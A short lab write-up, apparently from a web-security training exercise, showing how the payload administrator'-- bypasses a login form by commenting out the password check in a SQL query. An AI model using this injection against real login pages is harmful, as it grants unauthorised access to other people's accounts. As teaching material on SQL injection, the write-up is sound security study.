## Lab 02: SQL Injection : Login Bypass
 
**Technique:** Comment Truncation
**Status:** Solved
 
### Context
 
The login form passes the submitted username and password into a SQL query that checks both values. Because the username field is injected directly without sanitisation, it is possible to close the username string early and comment out the password check entirely.
 
### Final Payload (username field)
 
```
administrator'--
```
 
### What Happens Inside the Query
 
```sql
-- Original query structure:
SELECT * FROM users WHERE username = '...' AND password = '...'
 
-- After injection:
SELECT * FROM users WHERE username = 'administrator'--' AND password = '...'
```
 
### Payload Breakdown
 
| Token | Purpose |
|---|---|
| `administrator` | Valid username, the query will match this specific account |
| `'` | Closes the opening string quote the application placed before the username value |
| `--` | SQL comment, renders the `AND password = ...` clause invisible to the database, no password check is performed |
 
### Result
 
Authenticated directly as administrator. Lab solved.
 
---
 
